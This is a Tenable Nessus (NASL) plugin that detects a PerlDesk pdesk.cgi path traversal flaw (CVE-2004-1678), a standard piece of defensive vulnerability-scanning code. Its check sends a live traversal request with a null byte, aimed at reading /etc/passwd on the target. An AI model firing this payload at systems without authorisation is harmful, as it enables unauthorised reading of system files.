#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
 script_id(14733);
 script_version("$Revision: 1.12 $");
 script_cve_id("CVE-2004-1678");
 script_bugtraq_id(11160);
 script_osvdb_id(9954);

 script_name(english:"PerlDesk pdesk.cgi lang Parameter Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"It is possible to read arbitrary files from the remote
system." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PerlDesk, a web-based help desk 
and email management application written in perl.

There is a file inclusion issue in the remote version of 
this software which may allow an attacker to read fragments 
of arbitrary files on the remote host and to execute arbirary
perl scripts, provided that an attacker may upload a script 
in the first place." );
 script_set_attribute(attribute:"solution", value:
"Upgrade to the latest version of this software." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2004/09/15");
 script_set_attribute(attribute:"vuln_publication_date", value: "2004/09/12");
 script_cvs_date("$Date: 2011/08/18 21:24:38 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 script_summary(english:"Determines if perldesk is vulnerable to a file inclusion");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses");
 script_copyright(english:"This script is Copyright (C) 2004-2011 Tenable Network Security, Inc.");
 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("global_settings.inc");
include("http.inc");
include("misc_func.inc");

port = get_http_port(default:80);

res = http_send_recv3(port:port, method:"GET", item:"/cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00", exit_on_fail: 1);
 
if('"*:0"' >< res[2] && '"/bin/' >< res[2] )
{
  security_warning(port);
  exit(0);
}
